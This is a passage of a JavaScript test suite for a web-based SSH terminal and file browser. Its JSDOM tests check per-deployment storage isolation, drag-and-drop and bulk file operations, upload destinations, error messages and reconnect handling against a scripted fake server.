  ok(names(win).includes('zeta.txt'), 'failed navigation kept the previous listing');
  ok($(win, 'fbPath').getAttribute('data-path') === '/home/alice', 'breadcrumbs still usable');
  ok(!/fb-msg err/.test($(win, 'fbList').innerHTML), 'no error replaced the list');
  cleanup(env);
});

test('isolate_storage: the login screen never paints another deployment\'s saved cards', async () => {
  // renderSaved() ran at module init, before /api/config told us the
  // storage prefix - so it read the SHARED namespace and showed another
  // deployment's cards until config arrived.
  const plan = [{action: 'config', delay: 150,
                 response: {restrict_hosts: false, connections: [], isolate_storage: true}}];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                               url: 'http://localhost/inst-a/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.localStorage.clear();
  win.localStorage.setItem('websh_connections',
    JSON.stringify([{name: 'OTHER-DEPLOYMENT', host: 'secret.internal', user: 'root', port: 22}]));
  win.localStorage.setItem('/inst-a/websh_connections',
    JSON.stringify([{name: 'MINE', host: 'mine.example', user: 'me', port: 22}]));
  win.eval(js + EXPOSE);
  await sleep(40);                        // config still in flight
  const before = win.document.getElementById('savedList').textContent;
  ok(!/OTHER-DEPLOYMENT|secret\.internal/.test(before),
     'nothing from the shared namespace before config; got ' + JSON.stringify(before));
  await sleep(200);
  const after = win.document.getElementById('savedList').textContent;
  ok(/MINE/.test(after) && !/OTHER-DEPLOYMENT/.test(after),
     'path-scoped cards after config; got ' + JSON.stringify(after));
  await closeDom(dom);
});

test('api(): a non-JSON reply becomes a readable error, not "Unexpected token <"', async () => {
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const realFetch = win.fetch;
  win.fetch = () => Promise.resolve({
    status: 502, statusText: 'Bad Gateway',
    json: () => Promise.reject(new SyntaxError("Unexpected token '<'"))});
  const r = await win.api('rm', {body: {x: 1}});
  ok(r && /HTTP 502 Bad Gateway/.test(r.error), 'error names the status; got ' + JSON.stringify(r));
  ok(!/Unexpected token/.test(r.error), 'no JSON parser noise');
  win.fetch = realFetch;
  ok(win.isCapacityError({code: 'session_cap_global'}, 'whatever'), 'code recognised');
  ok(win.isCapacityError({}, 'too many active sessions'), 'prose fallback kept for old servers');
  ok(!win.isCapacityError({code: 'other'}, 'nope'), 'unrelated error is not capacity');
  cleanup(env);
});

test('file browser: header names the host; delete/rename say folder vs file', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  p.user = 'alice'; p.host = 'prod.example';
  win.showFileBrowser(p.id);
  await sleep(30);
  ok($(win, 'fbHost').textContent === 'alice@prod.example' && !$(win, 'fbHost').hidden,
     'user@host shown; got ' + $(win, 'fbHost').textContent);
  const d = rowFor(win, 'adir');
  d.querySelector('[data-fb-del]').click();
  ok(/Delete folder/.test(d.textContent) && /only if empty/.test(d.textContent),
     'folder confirm says folder + non-recursive; got ' + d.textContent);
  d.querySelector('.fb-cf-no').click();
  const f = rowFor(win, 'zeta.txt');
  f.querySelector('[data-fb-del]').click();
  ok(/Delete zeta\.txt\?/.test(f.textContent) && !/only if empty/.test(f.textContent),
     'file confirm stays plain');
  f.querySelector('.fb-cf-yes').click();
  await sleep(40);
  ok(/Deleted zeta\.txt/.test(win.document.body.textContent), 'file toast');
  cleanup(env);
});

test('drag-and-drop: files dropped on a pane upload; folders and busy panes are refused; stray drops are swallowed', async () => {
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  p.host = 'h.example';
  const started = [];
  const realStart = win.startUploadFiles;
  win.startUploadFiles = (id, files) => started.push([id, files.map(f => f.name)]);
  const fileItem = name => ({kind: 'file', getAsFile: () => ({name, size: 3}),
                             webkitGetAsEntry: () => ({isDirectory: false})});
  const dirItem = name => ({kind: 'file', getAsFile: () => ({name, size: 0}),
                            webkitGetAsEntry: () => ({isDirectory: true})});
  const drag = (target, type, items) => {
    const ev = new win.Event(type, {bubbles: true, cancelable: true});
    Object.defineProperty(ev, 'dataTransfer', {value: {
      types: ['Files'], items, files: items.map(i => i.getAsFile()), dropEffect: ''}});
    target.dispatchEvent(ev);
    return ev;
  };
  drag(p.el, 'dragenter', [fileItem('a.txt')]);
  ok(p.el.classList.contains('drop-target'), 'pane highlights as a drop target');
  ok(p.el.getAttribute('data-drop-msg') === 'Drop to upload', 'instruction shown');
  const ev = drag(p.el, 'drop', [fileItem('a.txt'), dirItem('src'), fileItem('b.bin')]);
  ok(ev.defaultPrevented, 'drop handled (browser does not navigate)');
  ok(!p.el.classList.contains('drop-target'), 'highlight cleared');
  ok(started.length === 1 && JSON.stringify(started[0][1]) === '["a.txt","b.bin"]',
     'files uploaded, folder skipped; got ' + JSON.stringify(started));
  ok(/Folders can.t be uploaded/.test(win.document.body.textContent), 'folder refusal explained');
  // Busy pane: refused with the reason.
  p.upload = {cancelled: false};
  drag(p.el, 'dragenter', [fileItem('c.txt')]);
  ok(/already running/.test(p.el.getAttribute('data-drop-msg')), 'busy reason shown while dragging');
  drag(p.el, 'drop', [fileItem('c.txt')]);
  ok(started.length === 1, 'nothing started on a busy pane');
  p.upload = null;
  // A drop outside any pane must not navigate the tab away.
  const stray = drag(win.document.body, 'drop', [fileItem('d.txt')]);
  ok(stray.defaultPrevented, 'stray drop swallowed');
  // The Upload button path hands its FileList to the same function.
  const input = {files: [{name: 'e.txt', size: 1}], value: 'C:/fake/e.txt'};
  win.handleUpload(p.id, input);
  ok(started.length === 2 && started[1][1][0] === 'e.txt' && input.value === '',
     'button path uses startUploadFiles and resets the input');
  win.startUploadFiles = realStart;
  cleanup(env);
});

test('reconnecting is shown on the pane while the transport retries, and cleared on recovery', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's-rc', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  ok(!p.el.querySelector('.pane-reconnect'), 'no banner while healthy');
  // A transient transport failure inside the budget.
  p.firstFailureAt = Date.now();
  win.setReconnecting(p, true);
  const b = p.el.querySelector('.pane-reconnect');
  ok(b && /reconnecting/.test(b.textContent) && /\(\d+ s\)/.test(b.textContent),
     'banner with time left; got ' + (b && b.textContent));
  const badge = p.el.querySelector('[data-pane-badge]');
  ok(/Reconnecting/.test(badge.textContent) && /s-wait/.test(badge.className),
     'badge says Reconnecting; got ' + badge.textContent);
  // A real frame arrives -> retry clock cleared -> banner gone.
  win.clearRetryClock(p);
  ok(!p.el.querySelector('.pane-reconnect'), 'banner removed on recovery');
  ok(/Connected/.test(badge.textContent), 'badge back to Connected');
  ok(!p._reconnTimer, 'countdown timer stopped');
  // Budget exhausted -> transportFatal takes over and removes the banner.
  win.setReconnecting(p, true);
  p.term.write = () => {};
  win.transportFatal(p, new Error('x'));
  ok(!p.el.querySelector('.pane-reconnect'), 'banner removed when giving up');
  cleanup(env);
});

test('drag-and-drop: the highlight never gets stuck after a cancelled drag', async () => {
  // Regression: the highlight was driven by a dragenter/dragleave counter
  // only. A cancelled drag (Esc, or released outside the browser) gets no
  // final dragleave in Chromium, so "Drop to upload" and the dashed
  // outline stayed on the pane for good (reproduced in real Chromium).
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  p.host = 'h.example';
  const lit = () => p.el.classList.contains('drop-target');
  const fire = (target, type, extra) => {
    const ev = new win.Event(type, {bubbles: true, cancelable: true});
    Object.defineProperty(ev, 'dataTransfer', {value: {types: ['Files'], items: [], files: [], dropEffect: ''}});
    if (extra && 'relatedTarget' in extra) Object.defineProperty(ev, 'relatedTarget', {value: extra.relatedTarget});
    target.dispatchEvent(ev);
  };
  const child = p.el.querySelector('.pane-term');
  // Moving between the pane's own children keeps the highlight.
  fire(p.el, 'dragenter'); fire(child, 'dragenter');
  fire(p.el, 'dragleave', {relatedTarget: child});
  ok(lit(), 'moving onto a child keeps the highlight');
  // Leaving the window (no relatedTarget) clears it at once.
  fire(child, 'dragleave', {relatedTarget: null});
  ok(!lit(), 'leaving the pane/window clears it');
  // Any mouse movement means the drag is over (browsers suppress mouse
  // events during a drag) - the cancel-then-move case.
  fire(p.el, 'dragenter'); ok(lit(), 're-highlighted');
  win.document.dispatchEvent(new win.MouseEvent('mousemove', {bubbles: true}));
  ok(!lit(), 'mousemove after a cancel clears it');
  // No events at all (cancel with the mouse still): heartbeat clears it.
  fire(p.el, 'dragenter'); fire(p.el, 'dragover');
  await sleep(600);
  ok(lit(), 'still shown while within the heartbeat');
  fire(p.el, 'dragover');                          // UA keeps sending these while held
  await sleep(900);
  ok(lit(), 'a held drag stays highlighted (heartbeat re-armed)');
  await sleep(500);
  ok(!lit(), 'silence past the heartbeat clears it');
  // Refusal looks different from an invitation.
  p.upload = {cancelled: false};
  fire(p.el, 'dragenter');
  ok(p.el.classList.contains('drop-refused'), 'busy pane is styled as refused');
  win.document.dispatchEvent(new win.MouseEvent('mousemove', {bubbles: true}));
  ok(!p.el.classList.contains('drop-refused') && !lit(), 'refused style cleared too');
  p.upload = null;
  cleanup(env);
});

// ── Picking several entries at once ─────────────────────────────────
// Before this the browser could only act on one row at a time: clearing
// out twenty files meant twenty confirmations.
const pick = (win, name, shift) => {
  const row = rowFor(win, name);
  const ck = row.querySelector('.fb-ck');
  const ev = new win.MouseEvent('click', {bubbles: true, cancelable: true,
                                          shiftKey: !!shift});
  ck.dispatchEvent(ev);
  return row;
};

test('file browser: checkboxes pick rows without opening or downloading them', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const bar = $(win, 'fbSel');
  ok(bar.classList.contains('h'), 'no action strip until something is picked');
  ok(!rowFor(win, '..').querySelector('.fb-ck'), '".." has no checkbox');

  const lsBefore = env.log.filter(r => r.action === 'ls').length;
  pick(win, 'zeta.txt');
  ok(!bar.classList.contains('h'), 'strip appears');
  ok(/1 file selected/.test($(win, 'fbSelN').textContent),
     'counts what is picked; got ' + $(win, 'fbSelN').textContent);
  ok(rowFor(win, 'zeta.txt').classList.contains('fb-picked'), 'row marked');
  // The click must not have navigated or started a transfer.
  ok(env.log.filter(r => r.action === 'ls').length === lsBefore, 'did not navigate');
  ok(!p.download, 'did not start a download');

  pick(win, 'adir');
  ok(/1 file, 1 folder selected/.test($(win, 'fbSelN').textContent),
     'files and folders counted apart; got ' + $(win, 'fbSelN').textContent);
  pick(win, 'zeta.txt');           // toggle back off
  ok(/1 folder selected/.test($(win, 'fbSelN').textContent), 'toggles off again');
  cleanup(env);
});

test('file browser: shift-click picks the run between two rows', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  // Default order is newest-first with directories pinned on top.
  const order = Array.from($(win, 'fbList').querySelectorAll('.fb-row'))
    .filter(r => r.dataset.parent !== '1').map(r => r.dataset.name);
  pick(win, order[1]);
  pick(win, order[3], true);
  const picked = Array.from($(win, 'fbList').querySelectorAll('.fb-row.fb-picked'))
    .map(r => r.dataset.name);
  ok(picked.length === 3 && picked.join() === order.slice(1, 4).join(),
     'the whole run is picked; got ' + picked.join());
  cleanup(env);
});

test('file browser: a selection never outlives what is on screen', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  pick(win, 'zeta.txt');
  pick(win, 'alpha.txt');
  ok(/2 files selected/.test($(win, 'fbSelN').textContent), 'two picked');
  // Filtering one of them away must drop it: the strip may never count
  // something the user cannot see.
  $(win, 'fbFilter').value = 'zeta'; win.applyFbFilter();
  ok(/1 file selected/.test($(win, 'fbSelN').textContent),
     'hidden row left the selection; got ' + $(win, 'fbSelN').textContent);
  $(win, 'fbFilter').value = ''; win.applyFbFilter();
  ok(/1 file selected/.test($(win, 'fbSelN').textContent), 'and does not come back');
  // A new listing starts clean - the same name elsewhere is a different file.
  win.loadFbDir('/srv');
  await sleep(40);
  ok($(win, 'fbSel').classList.contains('h'), 'selection cleared on navigation');
  cleanup(env);
});

test('file browser: bulk delete asks once, then deletes one by one', async () => {
  const rm = [];
  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').map(e => e.action === 'rm'
    ? {action: 'rm', response: b => { rm.push(b.path);
        return b.path.endsWith('mid.txt') ? {error: 'Permission denied'} : {ok: true}; }}
    : e);
  const env = await mkEnv(plan); const win = env.win;
  const toasts = [];
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  win.showToast = (m, k) => toasts.push([k, m]);
  pick(win, 'zeta.txt'); pick(win, 'mid.txt'); pick(win, 'alpha.txt');

  win.fbAskBulkDelete();
  ok(/Delete 3 items\?/.test($(win, 'fbSelN').textContent),
     'one question for the batch; got ' + $(win, 'fbSelN').textContent);
  ok(rm.length === 0, 'nothing deleted before the answer');
  // Cancel puts the strip back without deleting anything.
  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
    .find(b => b.textContent === 'Cancel').click();
  ok(/3 files selected/.test($(win, 'fbSelN').textContent), 'cancel restores the strip');
  ok(rm.length === 0, 'cancel deleted nothing');

  win.fbAskBulkDelete();
  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
    .find(b => /^Delete 3$/.test(b.textContent)).click();
  await sleep(80);
  ok(rm.length === 3, 'one rm per entry; got ' + rm.length);
  ok(rm.every(path => /^\/home\/alice\//.test(path)),
     'absolute paths in the listed directory; got ' + rm.join());
  // One failed: the others still went, and the user is told which failed.
  const err = toasts.find(t => t[0] === 'err');
  ok(err && /Deleted 2 of 3/.test(err[1]) && /mid\.txt/.test(err[1]),
     'summary names the failure; got ' + JSON.stringify(err));
  ok($(win, 'fbSel').classList.contains('h'), 'selection cleared afterwards');
  cleanup(env);
});

test('file browser: bulk delete stops when the server says rate-limited', async () => {
  let n = 0;
  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').map(e => e.action === 'rm'
    ? {action: 'rm', response: () => (++n > 1
        ? {error: 'rate_limited', code: 'rate_limited'} : {ok: true})}
    : e);
  const env = await mkEnv(plan); const win = env.win;
  const toasts = [];
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  win.showToast = (m, k) => toasts.push([k, m]);
  pick(win, 'zeta.txt'); pick(win, 'mid.txt'); pick(win, 'alpha.txt');
  win.fbAskBulkDelete();
  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
    .find(b => /^Delete 3$/.test(b.textContent)).click();
  await sleep(80);
  ok(n === 2, 'stopped hammering after the refusal; got ' + n + ' calls');
  const warn = toasts.find(t => t[0] === 'warn');
  ok(warn && /deleted 1 of 3/.test(warn[1]),
     'says how far it got; got ' + JSON.stringify(warn));
  cleanup(env);
});

test('file browser: bulk download runs one at a time and skips folders', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const toasts = [];
  win.showToast = (m, k) => toasts.push([k, m]);
  // Record the order and prove only one transfer is ever in flight.
  const started = [];
  let live = 0, overlap = false;
  win.startFastDownload = (id, path, o) => {
    started.push(path);
    if (live > 0) overlap = true;
    live++;
    return sleep(5).then(() => { live--; return true; });
  };
  pick(win, 'zeta.txt'); pick(win, 'adir'); pick(win, 'alpha.txt');
  win.fbBulkDownload();
  await sleep(80);
  ok(started.length === 2, 'folders skipped; got ' + started.join());
  ok(!overlap, 'never two transfers at once');
  ok(toasts.some(t => /Folders can/.test(t[1])), 'says why the folder was skipped');
  ok(toasts.some(t => /Downloaded 2 files/.test(t[1])),
     'reports the total; got ' + JSON.stringify(toasts));
  cleanup(env);
});

// ── Review fixes: bulk download really queues, editors keep the checkbox ──
test('bulk download: the second file starts once the first has settled', async () => {
  // startFastDownload resolved as soon as the bytes were saved, but the
  // pane's slot (p.download) is only released by settleTransfer's timer;
  // the next call in the queue found it still taken and the whole batch
  // stopped after one file with "Stopped at ...". Drive the real
  // startFastDownload, not a stub.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const requested = [];
  const inner = win.fetch;
  win.fetch = (url, init) => {
    const u = new URL(url, 'http://x/');
    if (u.searchParams.get('action') !== 'download') return inner(url, init);
    requested.push(u.searchParams.get('path'));
    let sent = false;
    return Promise.resolve({
      ok: true, status: 200,
      headers: {get: h => h === 'Content-Length' ? '4' : null},
      body: {getReader: () => ({
        read: () => Promise.resolve(sent ? {done: true}
          : (sent = true, {done: false, value: new Uint8Array([1, 2, 3, 4])})),
        cancel: () => {},
      })},
    });
  };
  win.URL.createObjectURL = () => 'blob:x';
  win.URL.revokeObjectURL = () => {};
  win.HTMLAnchorElement.prototype.click = () => {};   // no jsdom navigation
  const toasts = [];
  win.showToast = (m, k) => toasts.push([k, m]);
  pick(win, 'zeta.txt'); pick(win, 'alpha.txt');
  win.fbBulkDownload();
  await sleep(900);                 // two transfers + two 250 ms settles
  ok(requested.length === 2, 'both files requested; got ' + JSON.stringify(requested));
  ok(requested.every(r => /^\/home\/alice\//.test(r)), 'absolute paths');
  ok(!toasts.some(t => /Stopped at/.test(t[1])), 'no "Stopped at"; got ' + JSON.stringify(toasts));
  ok(toasts.some(t => /Downloaded 2 files/.test(t[1])), 'reports both; got ' + JSON.stringify(toasts));
  ok(p.download === null || p.download === undefined, 'slot released at the end');
  cleanup(env);
});

test('file browser: the checkbox survives Cancel on a delete or rename editor', async () => {
  // The editors restore the row with innerHTML, which recreates the
  // checkbox without its listener; a click on it then bubbled to the
  // row and downloaded the file instead of selecting it.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const dl = [];
  win.startFastDownload = (id, path) => { dl.push(path); return Promise.resolve(true); };
  // Delete editor, then Cancel.
  let row = rowFor(win, 'zeta.txt');
  row.querySelector('[data-fb-del]').click();
  row.querySelector('.fb-cf-no').click();
  pick(win, 'zeta.txt');
  ok(rowFor(win, 'zeta.txt').classList.contains('fb-picked'), 'picked after a cancelled delete');
  ok(dl.length === 0, 'and nothing was downloaded; got ' + JSON.stringify(dl));
  ok(!$(win, 'fbOv').classList.contains('h'), 'browser still open');
  // Rename editor, then Cancel.
  row = rowFor(win, 'alpha.txt');
  row.querySelector('[data-fb-ren]').click();
  row.querySelector('.fb-ed-no').click();
  pick(win, 'alpha.txt');
  ok(rowFor(win, 'alpha.txt').classList.contains('fb-picked'), 'picked after a cancelled rename');
  ok(dl.length === 0, 'still no download');
  ok(/2 files selected/.test($(win, 'fbSelN').textContent), 'both counted');
  cleanup(env);
});

test('a failed move after upload says where the file is and why', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const d = (err, u) => win.describeFinalizeError(err, u);
  const u = {destDir: '/srv/www', currentTmp: '.websh-tmp-abc'};
  ok(/\/srv\/www no longer exists/.test(d('no such file or directory', u)),
     'missing folder named; got ' + d('no such file or directory', u));
  ok(/no permission to write to \/srv\/www/.test(d('Permission denied', u)), 'permission');
  ok(/no permission to write to \/srv\/www/.test(d('Read-only file system', u)), 'read-only');
  ok(/\.websh-tmp-abc/.test(d('Permission denied', u)), 'tells where the bytes are');
  ok(/not ready yet/.test(d('control socket not ready', u)), 'side channel');
  ok(/moved to \/srv\/www \(finalize exit 1: boom\)/.test(d('finalize exit 1: boom', u)),
     'unknown reasons are passed through; got ' + d('finalize exit 1: boom', u));
  ok(/the current directory/.test(d('Permission denied', {currentTmp: 't'})),
     'no chosen folder → the pane cwd wording');
  ok(/moved to/.test(d(new TypeError('Failed to fetch'), u)), 'an Error object is handled too');
  cleanup(env);
});

test('file browser: an upload whose move fails shows the server reason in the strip', async () => {
  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').concat([
    {action: 'upload_finalize', response: {error: 'no such file or directory'}},
  ]);
  const env = await mkEnv(plan); const win = env.win;
  okXhr(win);
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  win.fbStartUpload([fakeFile('a.txt', 3)]);
  await sleep(60);
  const text = $(win, 'fbXfer').querySelector('.fb-xfer-text').textContent;
  ok(/Upload failed: saved to your home folder/.test(text) && /\/home\/alice no longer exists/.test(text),
     'reason and folder in the strip; got ' + JSON.stringify(text));
  cleanup(env);
});

// ── Upload into the directory the file browser is showing ───────────
// Before this, an upload always landed wherever the shell happened to
// be standing - so the one place the user could not send a file to was
// the folder they had just opened in the browser.

// Minimal XHR that always succeeds, so tests exercise the finalize step.
function okXhr(win) {
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 200; this.responseText = '{"ok":true}'; }
    open() {} setRequestHeader() {} abort() {}
    send() { if (this.onload) this.onload(); }
  };
}
const FB_UPLOAD_PLAN = (path) => FB_PLAN(FB_ENTRIES, path).concat([
  {action: 'upload_finalize',
   response: b => ({ok: true, path: (b.dir || '/elsewhere') + '/' + b.final})},
]);
const fakeFile = (name, size) => ({name: name, size: size || 4});

test('file browser: an upload lands in the folder on screen, not the shell cwd', async () => {
  // The first listing answers /home/alice, the next one /srv/www - the
  // fake server echoes no paths, so the moves are scripted.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sa', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'ls', response: {path: '/home/alice', entries: FB_ENTRIES}, once: true},
    {action: 'ls', response: {path: '/srv/www', entries: FB_ENTRIES}},
    {action: 'upload_finalize',
     response: b => ({ok: true, path: (b.dir || '/elsewhere') + '/' + b.final})},
  ];
  const env = await mkEnv(plan); const win = env.win;
  okXhr(win);
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  // Navigate somewhere else first: the destination must follow the
  // browser, not the directory it opened at.
  win.loadFbDir('/srv/www');
  await sleep(40);
  ok($(win, 'fbPath').getAttribute('data-path') === '/srv/www', 'browser moved');
  const lsBefore = env.log.filter(r => r.action === 'ls').length;

  win.fbStartUpload([fakeFile('report.csv', 12)]);
  await sleep(60);
  const fin = env.log.filter(r => r.action === 'upload_finalize');
  ok(fin.length === 1, 'one finalize call; got ' + fin.length);
  ok(fin[0].body.dir === '/srv/www',
     'finalize names the directory on screen; got ' + fin[0].body.dir);
  ok(fin[0].body.final === 'report.csv', 'and the original file name');
  // A non-persistent pane used to be sent an `mv` as keystrokes; with a
  // named destination the server does it, so nothing is typed.
  ok(!env.log.some(r => r.action === 'input'), 'nothing typed into the terminal');
  // The listing refreshes so the file is simply there.
  ok(env.log.filter(r => r.action === 'ls').length > lsBefore,
     'directory listed again after the file landed');
  cleanup(env);
});

test('file browser: the transfer is visible while the browser covers the pane', async () => {
  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
  // An XHR that reports progress but never completes, so the strip can
  // be inspected mid-flight.
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 200; this.responseText = '{"ok":true}'; }
    open() {} setRequestHeader() {} abort() {}
    send() { if (this.upload.onprogress) this.upload.onprogress({loaded: 50}); }
  };
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const strip = $(win, 'fbXfer');
  ok(strip.classList.contains('h'), 'no strip while nothing is transferring');
  win.fbStartUpload([fakeFile('big.bin', 100)]);
  await sleep(20);
  ok(!strip.classList.contains('h'), 'strip shown during the upload');
  ok(/big\.bin/.test(strip.querySelector('.fb-xfer-text').textContent),
     'names the file; got ' + strip.querySelector('.fb-xfer-text').textContent);
  ok(strip.querySelector('.fb-xfer-bar').style.width === '50%',
     'mirrors the pane bar; got ' + strip.querySelector('.fb-xfer-bar').style.width);
  // Cancelling from the browser cancels the pane's transfer.
  win.fbCancelXfer();
  await sleep(5);
  ok(/Cancelled/.test(strip.querySelector('.fb-xfer-text').textContent),
     'cancel reaches the pane; got ' + strip.querySelector('.fb-xfer-text').textContent);
  cleanup(env);
});

test('file browser: refuses an upload it cannot aim, and says why', async () => {
  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
  okXhr(win);
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const toasts = [];
  win.showToast = (m, k) => toasts.push(m);

  // A transfer already running in this pane.
  p.upload = {files: [], fileIndex: 0};
  win.fbStartUpload([fakeFile('a.txt')]);
  ok(/already running/i.test(toasts.pop() || ''), 'busy pane refused with a reason');
  p.upload = null;

  // Rows that belong to a session this pane no longer has: the path on
  // screen may not exist on the host we would be uploading to.
  const realSid = p.sid;
  p.sid = 'other-sid';
  win.fbStartUpload([fakeFile('a.txt')]);
  ok(/still loading/i.test(toasts.pop() || ''), 'stale listing refused');
  p.sid = realSid;

  // Nothing at all selected is a no-op, not an error.
  win.fbStartUpload([]);
  ok(toasts.length === 0, 'empty selection says nothing');
  ok(!env.log.some(r => r.action === 'upload_finalize'), 'no upload was attempted');
  cleanup(env);
});

test('file browser: dropping files on the panel uploads into that folder', async () => {
  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
  okXhr(win);
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  const panel = win.document.querySelector('#fbOv .fb-panel');
  const dt = {types: ['Files'], files: [fakeFile('dropped.bin', 9)], items: null,
              dropEffect: ''};
  const ev = (type) => {
    const e = new win.Event(type, {bubbles: true, cancelable: true});
    e.dataTransfer = dt;
    panel.dispatchEvent(e);
    return e;
  };
  ev('dragenter');
  ok(panel.classList.contains('drop-target'), 'panel highlights for a file drag');
  ok(/\/home\/alice/.test(panel.getAttribute('data-drop-msg')),
     'the prompt names the destination; got ' + panel.getAttribute('data-drop-msg'));
  const dropped = ev('drop');
  await sleep(60);
  ok(dropped.defaultPrevented, 'the browser must not navigate to the file');
  ok(!panel.classList.contains('drop-target'), 'highlight cleared after the drop');
  const fin = env.log.filter(r => r.action === 'upload_finalize');
  ok(fin.length === 1 && fin[0].body.dir === '/home/alice',
     'uploaded into the shown directory; got ' + JSON.stringify(fin.map(f => f.body.dir)));
  cleanup(env);
});

test('drag-and-drop frame is its own layer above the terminal, not an outline', async () => {
  // An `outline` on .pane paints UNDER xterm's positioned render layers:
  // only the top (pane bar) and bottom strip of the frame were visible.
  // The frame must be a pseudo-element stacked above the terminal.
  const css = html;
  ok(!/\.pane\.drop-target\{[^}]*outline/.test(css), 'no outline-based frame on .pane.drop-target');
  // The rule is shared with the file browser's panel, so match the
  // declaration block by its selector list rather than an exact string.
  const before = (css.match(/\.pane\.drop-target::before[^{]*\{([^}]*)\}/) || [])[1] || '';
  ok(/border:2px dashed/.test(before), 'dashed frame drawn by ::before');
  const z = +((before.match(/z-index:(\d+)/) || [])[1] || 0);
  ok(z > 20, 'frame stacks above the terminal layers (z-index ' + z + ' > 20)');
  ok(/inset:\d+px/.test(before), 'frame spans the whole pane');
});

test('lossless reconnect: replayed output is trimmed by cursor, gaps are announced', async () => {
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  ok(p.outCursor === 0, 'a new session starts at cursor 0');
  const out = [];
  p.term.write = (b) => { out.push(typeof b === 'string' ? b : Buffer.from(b).toString('latin1')); };
  const b64 = t => Buffer.from(t, 'latin1').toString('base64');
  const frame = (text, cursor, extra) =>
    win.handleOutputPayload(p, Object.assign({data: b64(text), alive: true, cursor}, extra || {}), p.sid);
  frame('hello ', 6);
  frame('world', 11);
  ok(out.join('') === 'hello world' && p.outCursor === 11, 'in-order frames written; cursor 11');
  // After a reconnect the server replays from an older cursor (e.g.
  // EventSource re-sent its original URL): only the new tail is printed.
  frame('world!!', 13);
  ok(out.join('') === 'hello world!!', 'overlap trimmed; got ' + JSON.stringify(out.join('')));
  frame('world!!', 13);
  ok(out.join('') === 'hello world!!', 'a full duplicate prints nothing');
  // Bytes that fell out of the server's window are announced, not faked.
  frame('tail', 5017, {lost: 5000});
  ok(/5000 bytes of output were produced while disconnected/.test(out.join('')), 'gap announced');
  ok(out.join('').endsWith('tail') && p.outCursor === 5017, 'then the retained bytes');
  // reset: the server didn't know our cursor - take its data as-is.
  frame('fresh', 5, {reset: true});
  ok(out.join('').endsWith('fresh') && p.outCursor === 5, 'reset adopts the server cursor');
  // Frames without a cursor (older server) are written as before.
  win.handleOutputPayload(p, {data: b64('legacy'), alive: true}, p.sid);
  ok(out.join('').endsWith('legacy'), 'cursor-less frames still render');
  // The stream URL carries the cursor.
  let seen = null;
  const RealES = win.EventSource;
  win.EventSource = function (url) { seen = url; this.addEventListener = () => {}; this.close = () => {}; };
  win.closeStream(p); win.streamOutput(p);
  ok(seen && /[?&]since=5\b/.test(seen), 'stream URL resumes from the cursor; got ' + seen);
  win.EventSource = RealES;
  win.endSession(p, {});
  ok(p.outCursor === 0, 'endSession resets the cursor');
  cleanup(env);
});

test('UI chrome: one icon set, dark scrollbars, a quiet accent on the active pane', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  // Every button icon comes from the sprite - no emoji, no ad-hoc glyphs.
  // Comments mention both emoji and scrollbar-color on purpose; test the code.
  const code = html.replace(/\/\*[\s\S]*?\*\//g, '').replace(/<!--[\s\S]*?-->/g, '');
